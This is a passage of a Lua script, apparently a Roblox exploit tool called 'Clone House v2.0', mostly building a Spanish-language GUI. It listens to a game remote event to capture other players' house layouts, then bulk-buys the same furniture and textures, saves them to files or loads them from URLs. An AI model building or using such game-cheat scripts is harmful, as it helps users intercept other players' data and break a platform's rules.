    local header_fix = mk_frame(header,UDim2.new(1,0,0,16),UDim2.new(0,0,1,-16),clr.s)
    
    local title = mk_lbl(header,UDim2.new(0.5,0,1,0),UDim2.new(0,15,0,0),"🏠 Clone House v2.0",16,clr.t1)
    title.Font = Enum.Font.GothamBold
    
    local creator_lbl = mk_lbl(header,UDim2.new(0.3,0,0,16),UDim2.new(0.5,0,0,6),"👨‍💻 OneCreatorX",10,clr.accent)
    creator_lbl.TextXAlignment = Enum.TextXAlignment.Right
    
    local version_lbl = mk_lbl(header,UDim2.new(0.3,0,0,16),UDim2.new(0.5,0,0,26),"🚀 Versión Final",9,clr.t2)
    version_lbl.TextXAlignment = Enum.TextXAlignment.Right
    
    local close_btn = mk_btn(header,UDim2.new(0,25,0,25),UDim2.new(1,-35,0,12),clr.err,"✕",6)
    local minimize_btn = mk_btn(header,UDim2.new(0,25,0,25),UDim2.new(1,-65,0,12),clr.warn,"−",6)
    
    local tab_frame = mk_frame(main_frame,UDim2.new(1,-20,0,30),UDim2.new(0,10,0,60),clr.card,8)
    
    local houses_tab = mk_btn(tab_frame,UDim2.new(0.25,0,0,22),UDim2.new(0,4,0,4),clr.accent,"🏠 Casas",6)
    local files_tab = mk_btn(tab_frame,UDim2.new(0.25,0,0,22),UDim2.new(0.25,4,0,4),clr.inp,"📁 Archivos",6)
    local tools_tab = mk_btn(tab_frame,UDim2.new(0.25,0,0,22),UDim2.new(0.5,4,0,4),clr.inp,"🔧 Herramientas",6)
    local log_tab = mk_btn(tab_frame,UDim2.new(0.25,0,0,22),UDim2.new(0.75,4,0,4),clr.inp,"📊 Actividad",6)
    
    local content_frame = mk_frame(main_frame,UDim2.new(1,-20,1,-105),UDim2.new(0,10,0,100),clr.bg,8)
    
    local houses_content = mk_frame(content_frame,UDim2.new(1,0,1,0),UDim2.new(0,0,0,0),Color3.new(0,0,0))
    houses_content.BackgroundTransparency = 1
    
    local files_content = mk_frame(content_frame,UDim2.new(1,0,1,0),UDim2.new(0,0,0,0),Color3.new(0,0,0))
    files_content.BackgroundTransparency,files_content.Visible = 1,false
    
    local tools_content = mk_frame(content_frame,UDim2.new(1,0,1,0),UDim2.new(0,0,0,0),Color3.new(0,0,0))
    tools_content.BackgroundTransparency,tools_content.Visible = 1,false
    
    local log_content = mk_frame(content_frame,UDim2.new(1,0,1,0),UDim2.new(0,0,0,0),Color3.new(0,0,0))
    log_content.BackgroundTransparency,log_content.Visible = 1,false
    
    local filter_frame = mk_frame(houses_content,UDim2.new(1,-10,0,70),UDim2.new(0,5,0,5),clr.card,6)
    
    local search_input = mk_input(filter_frame,UDim2.new(0.28,0,0,20),UDim2.new(0,8,0,6),clr.inp,"🔍 Buscar...",4)
    
    local sort_name = mk_btn(filter_frame,UDim2.new(0.12,0,0,20),UDim2.new(0.3,4,0,6),clr.accent,"Nombre",4)
    local sort_price = mk_btn(filter_frame,UDim2.new(0.12,0,0,20),UDim2.new(0.43,0,0,6),clr.inp,"Precio",4)
    local sort_furniture = mk_btn(filter_frame,UDim2.new(0.12,0,0,20),UDim2.new(0.56,0,0,6),clr.inp,"Muebles",4)
    local sort_asc = mk_btn(filter_frame,UDim2.new(0.06,0,0,20),UDim2.new(0.7,0,0,6),clr.ok,"↑",4)
    local sort_desc = mk_btn(filter_frame,UDim2.new(0.06,0,0,20),UDim2.new(0.77,0,0,6),clr.inp,"↓",4)
    local refresh_btn = mk_btn(filter_frame,UDim2.new(0.15,0,0,20),UDim2.new(0.84,4,0,6),clr.a,"🔄 Actualizar",4)
    
    local min_price = mk_input(filter_frame,UDim2.new(0.14,0,0,20),UDim2.new(0,8,0,35),clr.inp,"Precio mín",4)
    local max_price = mk_input(filter_frame,UDim2.new(0.14,0,0,20),UDim2.new(0.15,0,0,35),clr.inp,"Precio máx",4)
    
    local show_detected = mk_btn(filter_frame,UDim2.new(0.14,0,0,20),UDim2.new(0.31,0,0,35),clr.ok,"✅ Detectadas",4)
    local show_files = mk_btn(filter_frame,UDim2.new(0.14,0,0,20),UDim2.new(0.46,0,0,35),clr.ok,"✅ Archivos",4)
    local apply_filters = mk_btn(filter_frame,UDim2.new(0.14,0,0,20),UDim2.new(0.61,0,0,35),clr.accent,"Aplicar",4)
    local reset_filters = mk_btn(filter_frame,UDim2.new(0.14,0,0,20),UDim2.new(0.76,0,0,35),clr.warn,"Reset",4)
    
    local houses_scroll = Instance.new("ScrollingFrame")
    houses_scroll.Size,houses_scroll.Position,houses_scroll.BackgroundTransparency,houses_scroll.ScrollBarThickness,houses_scroll.ScrollBarImageColor3,houses_scroll.Parent = UDim2.new(1,-10,1,-85),UDim2.new(0,5,0,85),1,5,clr.accent,houses_content
    local houses_layout = Instance.new("UIListLayout"); houses_layout.SortOrder,houses_layout.Padding,houses_layout.Parent = Enum.SortOrder.LayoutOrder,UDim.new(0,6),houses_scroll
    
    local files_scroll = Instance.new("ScrollingFrame")
    files_scroll.Size,files_scroll.Position,files_scroll.BackgroundTransparency,files_scroll.ScrollBarThickness,files_scroll.ScrollBarImageColor3,files_scroll.Parent = UDim2.new(1,-10,1,-10),UDim2.new(0,5,0,5),1,5,clr.accent,files_content
    local files_layout = Instance.new("UIListLayout"); files_layout.SortOrder,files_layout.Padding,files_layout.Parent = Enum.SortOrder.LayoutOrder,UDim.new(0,6),files_scroll
    
    local url_frame = mk_frame(tools_content,UDim2.new(1,-10,0,40),UDim2.new(0,5,0,5),clr.card,6)
    mk_lbl(url_frame,UDim2.new(0,100,0,16),UDim2.new(0,8,0,4),"🌐 URL:",10,clr.t1)
    local url_input = mk_input(url_frame,UDim2.new(1,-150,0,20),UDim2.new(0,8,0,18),clr.inp,"https://ejemplo.com/casa.json",4)
    local url_btn = mk_btn(url_frame,UDim2.new(0,60,0,20),UDim2.new(1,-70,0,18),clr.a,"📥 Descargar",4)
    
    local clipboard_frame = mk_frame(tools_content,UDim2.new(1,-10,0,40),UDim2.new(0,5,0,55),clr.card,6)
    mk_lbl(clipboard_frame,UDim2.new(0,100,0,16),UDim2.new(0,8,0,4),"📋 Portapapeles:",10,clr.t1)
    local clipboard_input = mk_input(clipboard_frame,UDim2.new(1,-150,0,20),UDim2.new(0,8,0,18),clr.inp,"Pegar datos aquí o dejar vacío",4)
    local clipboard_btn = mk_btn(clipboard_frame,UDim2.new(0,60,0,20),UDim2.new(1,-70,0,18),clr.ok,"📋 Procesar",4)
    
    local config_frame = mk_frame(tools_content,UDim2.new(1,-10,0,40),UDim2.new(0,5,0,105),clr.card,6)
    mk_lbl(config_frame,UDim2.new(0,100,0,16),UDim2.new(0,8,0,4),"⚙️ Configuración:",10,clr.t1)
    local notif_toggle = mk_btn(config_frame,UDim2.new(0,80,0,20),UDim2.new(0,8,0,18),cfg.notif and clr.ok or clr.err,cfg.notif and "✅ Notif" or "❌ Notif",4)
    local clear_states = mk_btn(config_frame,UDim2.new(0,80,0,20),UDim2.new(0,95,0,18),clr.warn,"🗑️ Limpiar",4)
    local clear_temp = mk_btn(config_frame,UDim2.new(0,80,0,20),UDim2.new(0,182,0,18),clr.warn,"🗑️ Temp",4)
    
    local log_scroll = Instance.new("ScrollingFrame")
    log_scroll.Size,log_scroll.Position,log_scroll.BackgroundTransparency,log_scroll.ScrollBarThickness,log_scroll.ScrollBarImageColor3,log_scroll.Parent = UDim2.new(1,-10,1,-35),UDim2.new(0,5,0,5),1,5,clr.accent,log_content
    local log_layout = Instance.new("UIListLayout"); log_layout.SortOrder,log_layout.Padding,log_layout.Parent = Enum.SortOrder.LayoutOrder,UDim.new(0,2),log_scroll
    
    local log_clear = mk_btn(log_content,UDim2.new(0,80,0,22),UDim2.new(1,-90,1,-30),clr.warn,"🗑️ Limpiar",4)
    
    local current_tab = "houses"
    local minimized = false
    
    local function switch_tab(tab_name)
        current_tab = tab_name
        houses_content.Visible = tab_name == "houses"
        files_content.Visible = tab_name == "files"
        tools_content.Visible = tab_name == "tools"
        log_content.Visible = tab_name == "log"
        
        houses_tab.BackgroundColor3 = tab_name == "houses" and clr.accent or clr.inp
        files_tab.BackgroundColor3 = tab_name == "files" and clr.accent or clr.inp
        tools_tab.BackgroundColor3 = tab_name == "tools" and clr.accent or clr.inp
        log_tab.BackgroundColor3 = tab_name == "log" and clr.accent or clr.inp
    end
    
    local function update_sort_buttons()
        sort_name.BackgroundColor3 = filters.sort == "name" and clr.accent or clr.inp
        sort_price.BackgroundColor3 = filters.sort == "price" and clr.accent or clr.inp
        sort_furniture.BackgroundColor3 = filters.sort == "furniture" and clr.accent or clr.inp
        sort_asc.BackgroundColor3 = filters.order == "asc" and clr.ok or clr.inp
        sort_desc.BackgroundColor3 = filters.order == "desc" and clr.ok or clr.inp
        show_detected.BackgroundColor3 = filters.show_detected and clr.ok or clr.err
        show_files.BackgroundColor3 = filters.show_files and clr.ok or clr.err
        show_detected.Text = filters.show_detected and "✅ Detectadas" or "❌ Detectadas"
        show_files.Text = filters.show_files and "✅ Archivos" or "❌ Archivos"
    end
    
    local function refresh_log()
        for _,c in ipairs(log_scroll:GetChildren()) do if c:IsA("Frame") then c:Destroy() end end
        for i = math.max(1, #log - 25), #log do
            local entry = log[i]
            if entry then
                local log_entry = mk_frame(log_scroll,UDim2.new(1,-6,0,20),UDim2.new(0,0,0,0),entry.color,4)
                local time_lbl = mk_lbl(log_entry,UDim2.new(0,50,1,0),UDim2.new(0,4,0,0),entry.time,8,clr.t2)
                local msg_lbl = mk_lbl(log_entry,UDim2.new(1,-55,1,0),UDim2.new(0,55,0,0),entry.text,8,clr.t1)
                msg_lbl.TextTruncate = Enum.TextTruncate.AtEnd
            end
        end
        log_scroll.CanvasSize = UDim2.new(0,0,0,log_layout.AbsoluteContentSize.Y)
        log_scroll.CanvasPosition = Vector2.new(0,log_scroll.CanvasSize.Y.Offset)
    end
    
    local function add_house_card(house_data, scroll_frame)
        local card = mk_frame(scroll_frame,UDim2.new(1,0,0,120),UDim2.new(0,0,0,0),clr.card,6)
        
        local header_frame = mk_frame(card,UDim2.new(1,-10,0,25),UDim2.new(0,5,0,5),clr.s,4)
        local name_text = "🏠 "..string.sub(house_data.name or house_data.owner.."_Casa",1,25)
        mk_lbl(header_frame,UDim2.new(0.65,0,0,16),UDim2.new(0,6,0,4),name_text,11,clr.t1).Font = Enum.Font.GothamBold
        
        local source_color = house_data.source == "detected" and clr.ok or house_data.source == "file" and clr.a or clr.warn
        local source_text = house_data.source == "detected" and "🔴 En Vivo" or house_data.source == "file" and "📁 Archivo" or "📋 Temporal"
        mk_lbl(header_frame,UDim2.new(0.35,0,0,16),UDim2.new(0.65,0,0,4),source_text,9,source_color)
        
        local info_frame = mk_frame(card,UDim2.new(1,-10,0,45),UDim2.new(0,5,0,35),clr.bg,4)
        mk_lbl(info_frame,UDim2.new(0.3,0,0,10),UDim2.new(0,6,0,3),"👤 "..string.sub(house_data.owner or "Desconocido",1,10),8,clr.t2)
        mk_lbl(info_frame,UDim2.new(0.35,0,0,10),UDim2.new(0.3,0,0,3),"🏗️ "..string.sub(house_data.house_type or "unknown",1,8),8,clr.t2)
        mk_lbl(info_frame,UDim2.new(0.35,0,0,10),UDim2.new(0.65,0,0,3),"📅 "..(house_data.date and string.sub(house_data.date,1,10) or "Sin fecha"),8,clr.t2)
        
        local items_text = "📦 "..house_data.furniture_count.." 🎨 "..house_data.texture_count
        mk_lbl(info_frame,UDim2.new(0.4,0,0,10),UDim2.new(0,6,0,16),items_text,8,clr.accent)
        
        local price_lbl = mk_lbl(info_frame,UDim2.new(0.6,0,0,10),UDim2.new(0.4,0,0,16),"💰 Calculando...",8,clr.warn)
        
        if house_data.estimated_price and house_data.estimated_price > 0 then
            price_lbl.Text = "💰 $"..format_price(house_data.estimated_price)
            price_lbl.TextColor3 = clr.accent
        else
            spawn(function()
                local total_price, found_prices, total_items = calculate_house_price(house_data.furniture)
                if total_price > 0 then
                    price_lbl.Text = "💰 $"..format_price(total_price)
                    price_lbl.TextColor3 = clr.accent
                    house_data.estimated_price = total_price
                else
                    price_lbl.Text = "💰 No disponible"
                    price_lbl.TextColor3 = clr.t2
                end
            end)
        end
        
        local purchase_key = get_purchase_key(house_data.id or house_data.timestamp, house_data.source ~= "detected")
        local state = purchase_states[purchase_key]
        
        local status_text, status_color
        if state and state.completed then
            status_text = "🎉 CLONADA"
            status_color = clr.ok
        elseif state and state.has_failed then
            status_text = "❌ "..#state.failed_items.." errores"
            status_color = clr.err
        elseif state and state.attempts > 0 then
            status_text = "🔄 Intento #"..state.attempts
            status_color = clr.warn
        else
            status_text = "✅ Listo"
            status_color = clr.ok
        end
        
        mk_lbl(info_frame,UDim2.new(1,-10,0,10),UDim2.new(0,6,0,30),status_text,8,status_color)
        
        local btn_frame = mk_frame(card,UDim2.new(1,-10,0,25),UDim2.new(0,5,1,-30),clr.inp,4)
        local fb = mk_btn(btn_frame,UDim2.new(0.18,0,0,16),UDim2.new(0,4,0,4),clr.ok,"🪑",4)
        local tb = mk_btn(btn_frame,UDim2.new(0.18,0,0,16),UDim2.new(0.2,0,0,4),clr.a,"🎨",4)
        local sb = mk_btn(btn_frame,UDim2.new(0.18,0,0,16),UDim2.new(0.4,0,0,4),clr.warn,"💾",4)
        local cb = mk_btn(btn_frame,UDim2.new(0.18,0,0,16),UDim2.new(0.6,0,0,4),clr.accent,"📋",4)
        local db = mk_btn(btn_frame,UDim2.new(0.18,0,0,16),UDim2.new(0.8,0,0,4),clr.err,"🗑️",4)
        
        fb.MouseButton1Click:Connect(function()
            if house_data.source == "detected" then
                buy_furniture(house_data.furniture, house_data.id or house_data.timestamp, false)
            else
                buy_furniture(house_data.furniture, house_data.timestamp, true)
            end
        end)
        
        tb.MouseButton1Click:Connect(function()
            buy_textures(house_data.textures, house_data.id or house_data.timestamp)
        end)
        
        sb.MouseButton1Click:Connect(function()
            save_house(house_data, house_data.name, house_data.owner)
        end)
        
        cb.MouseButton1Click:Connect(function()
            local total_price, found_prices, total_items = calculate_house_price(house_data.furniture)
            local share_data = {
                furniture = house_data.furniture or {},
                textures = house_data.textures or {},
                name = house_data.name,
                owner = house_data.owner,
                house_type = house_data.house_type or "unknown",
                estimated_price = total_price,
                priced_items = found_prices,
                furniture_count = #(house_data.furniture or {}),
                texture_count = #(house_data.textures or {}),
                creator = "OneCreatorX"
            }
            
            local compressed = compress_house_data(share_data)
            local json_data = HttpService:JSONEncode(compressed)
            
            setclipboard(json_data)
            logmsg("📋 Copiado: "..house_data.name,clr.ok)
            notif("📋 ¡Copiado al portapapeles!",clr.ok)
        end)
        
        db.MouseButton1Click:Connect(function()
            if house_data.source == "detected" then
                d[house_data.id],td[house_data.id] = nil,nil
                house_cards[house_data.id] = nil
            elseif house_data.source == "file" and house_data.filepath then
                pcall(function() delfile(house_data.filepath) end)
            else
                for i, temp_house in ipairs(temp_houses) do
                    if temp_house.timestamp == house_data.timestamp then
                        table.remove(temp_houses, i)
                        break
                    end
                end
            end
            card:Destroy()
            scroll_frame.CanvasSize = UDim2.new(0,0,0,scroll_frame.UIListLayout.AbsoluteContentSize.Y)
            logmsg("🗑️ Eliminada: "..house_data.name,clr.warn)
        end)
        
        scroll_frame.CanvasSize = UDim2.new(0,0,0,scroll_frame.UIListLayout.AbsoluteContentSize.Y)
        return card
    end
    
    local function refresh_houses()
        for _,c in ipairs(houses_scroll:GetChildren()) do if c:IsA("Frame") then c:Destroy() end end
        local all_houses = get_all_houses()
        local filtered = filter_houses(all_houses)
        for _,house in ipairs(filtered) do
            add_house_card(house, houses_scroll)
        end
    end
    
    local function refresh_files()
        for _,c in ipairs(files_scroll:GetChildren()) do if c:IsA("Frame") then c:Destroy() end end
        local file_houses = load_houses()
        for _,house in ipairs(file_houses) do
            add_house_card(house, files_scroll)
        end
    end
    
    houses_tab.MouseButton1Click:Connect(function() switch_tab("houses") end)
    files_tab.MouseButton1Click:Connect(function() switch_tab("files"); refresh_files() end)
    tools_tab.MouseButton1Click:Connect(function() switch_tab("tools") end)
    log_tab.MouseButton1Click:Connect(function() switch_tab("log"); refresh_log() end)
    
    close_btn.MouseButton1Click:Connect(function() gui:Destroy() end)
    minimize_btn.MouseButton1Click:Connect(function()
        minimized = not minimized
        if minimized then
            main_frame.Size = UDim2.new(0.35,0,0,50)
            content_frame.Visible = false
            tab_frame.Visible = false
            minimize_btn.Text = "+"
            title.Text = "🏠 Clone House"
        else
            main_frame.Size = UDim2.new(0.85,0,0.8,0)
            content_frame.Visible = true
            tab_frame.Visible = true
            minimize_btn.Text = "−"
            title.Text = "🏠 Clone House v2.0"
        end
    end)
    
    url_btn.MouseButton1Click:Connect(function()
        local url = url_input.Text
        if url == "" then
            notif("⚠️ URL requerida",clr.warn)
            return
        end
        
        local house_data = download_from_url(url)
        if house_data then
            table.insert(temp_houses, house_data)
            if current_tab == "houses" then refresh_houses() end
            url_input.Text = ""
        end
    end)
    
    clipboard_btn.MouseButton1Click:Connect(function()
        local data_text = clipboard_input.Text
        local house_data = process_clipboard_data(data_text)
        if house_data then
            table.insert(temp_houses, house_data)
            if current_tab == "houses" then refresh_houses() end
            clipboard_input.Text = ""
        end
    end)
    
    notif_toggle.MouseButton1Click:Connect(function()
        cfg.notif = not cfg.notif
        notif_toggle.BackgroundColor3 = cfg.notif and clr.ok or clr.err
        notif_toggle.Text = cfg.notif and "✅ Notif" or "❌ Notif"
        logmsg("⚙️ Notificaciones: "..(cfg.notif and "ON" or "OFF"),clr.a)
    end)
    
    clear_states.MouseButton1Click:Connect(function()
        purchase_states = {}
        logmsg("🗑️ Estados limpiados",clr.ok)
        notif("🗑️ Estados limpiados",clr.ok)
        if current_tab == "houses" then refresh_houses() end
    end)
    
    clear_temp.MouseButton1Click:Connect(function()
        temp_houses = {}
        logmsg("🗑️ Casas temporales limpiadas",clr.ok)
        notif("🗑️ Temporales limpiadas",clr.ok)
        if current_tab == "houses" then refresh_houses() end
    end)
    
    log_clear.MouseButton1Click:Connect(function()
        log = {}
        refresh_log()
    end)
    
    sort_name.MouseButton1Click:Connect(function() filters.sort = "name"; update_sort_buttons(); refresh_houses() end)
    sort_price.MouseButton1Click:Connect(function() filters.sort = "price"; update_sort_buttons(); refresh_houses() end)
    sort_furniture.MouseButton1Click:Connect(function() filters.sort = "furniture"; update_sort_buttons(); refresh_houses() end)
    sort_asc.MouseButton1Click:Connect(function() filters.order = "asc"; update_sort_buttons(); refresh_houses() end)
    sort_desc.MouseButton1Click:Connect(function() filters.order = "desc"; update_sort_buttons(); refresh_houses() end)
    
    show_detected.MouseButton1Click:Connect(function() 
        filters.show_detected = not filters.show_detected
        update_sort_buttons()
        refresh_houses()
    end)
    
    show_files.MouseButton1Click:Connect(function() 
        filters.show_files = not filters.show_files
        update_sort_buttons()
        refresh_houses()
    end)
    
    search_input.FocusLost:Connect(function() 
        filters.search = search_input.Text
        refresh_houses()
    end)
    
    min_price.FocusLost:Connect(function() 
        filters.min_price = tonumber(min_price.Text) or 0
        refresh_houses()
    end)
    
    max_price.FocusLost:Connect(function() 
        filters.max_price = tonumber(max_price.Text) or math.huge
        refresh_houses()
    end)
    
    apply_filters.MouseButton1Click:Connect(function()
        filters.search = search_input.Text
        filters.min_price = tonumber(min_price.Text) or 0
        filters.max_price = tonumber(max_price.Text) or math.huge
        refresh_houses()
        notif("🔍 Filtros aplicados",clr.ok)
    end)
    
    reset_filters.MouseButton1Click:Connect(function()
        filters = {search="",sort="name",order="asc",min_price=0,max_price=math.huge,show_detected=true,show_files=true}
        search_input.Text = ""
        min_price.Text = ""
        max_price.Text = ""
        update_sort_buttons()
        refresh_houses()
        notif("🔄 Filtros reiniciados",clr.ok)
    end)
    
    refresh_btn.MouseButton1Click:Connect(function()
        refresh_houses()
        notif("🔄 Lista actualizada",clr.ok)
    end)
    
    update_sort_buttons()
    
    spawn(function()
        while gui and gui.Parent do
            if current_tab == "log" then
                refresh_log()
            end
            wait(2)
        end
    end)
    
    return houses_scroll, refresh_houses
end

local function add_card(scr,hid,own,cnt,tcnt,refresh_func)
    if not scr or not refresh_func then
        logmsg("❌ Error: Parámetros inválidos en add_card",clr.err)
        return
    end
    
    local house_data = {
        id = hid,
        name = own.."_Casa",
        owner = own,
        furniture = d[hid] or {},
        textures = td[hid] or {},
        furniture_count = cnt,
        texture_count = tcnt,
        house_type = user_houses[hid] or "unknown",
        source = "detected",
        timestamp = hid
    }
    
    house_cards[hid] = {owner = own}
    
    spawn(function()
        local total_price, found_prices, total_items = calculate_house_price(d[hid])
        if total_price > 0 then
            logmsg("💰 Precio "..own..": $"..format_price(total_price),clr.a)
        end
        refresh_func()
    end)
end

local function chk(...) local a = {...}; return #a >= 3 and typeof(a[3]) == "table" and a[3].furniture and a[3].house_id,a end

local hev = rem("DataAPI/DataChanged")
local scr, refresh_houses = init()

if hev then
    hev.OnClientEvent:Connect(function(...)
        local ok,args = chk(...)
        if ok then
            for _,val in ipairs(args) do
                if type(val) == "table" and val.furniture and val.house_id then
                    local hid,own = tostring(val.house_id),tostring(val.player or "Unknown")
                    
                    local fmt,tfmt,tcnt = ser(val.furniture),{},0
                    if val.textures then tfmt = tex_ser(val.textures); tcnt = #tfmt end
                    
                    local house_owner = val.owner or val.player
                    if house_owner and val.building_type then
                        cur_owner,cur_type,cur_hid = tostring(house_owner),val.building_type,hid
                        user_houses[hid] = val.building_type
                        
                        logmsg("🏠 Detectada - ID: "..hid.." Dueño: "..tostring(house_owner).." Tipo: "..val.building_type,clr.a)
                    end
                    
                    if val.building_type then 
                        user_houses[hid] = val.building_type
                    end
                    
                    if #fmt > 0 or tcnt > 0 then
                        d[hid],td[hid] = fmt,tfmt
                        add_card(scr,hid,own,#fmt,tcnt,refresh_houses)
                        logmsg("✅ Agregada: "..own.." ("..#fmt.." muebles, "..tcnt.." texturas)",clr.ok)
                    end
                    break
                end
            end
        end
    end)
end

logmsg("🚀 Clone House v2.0 - OneCreatorX",clr.ok)
notif("🚀 ¡Clone House v2.0 listo!",clr.ok)
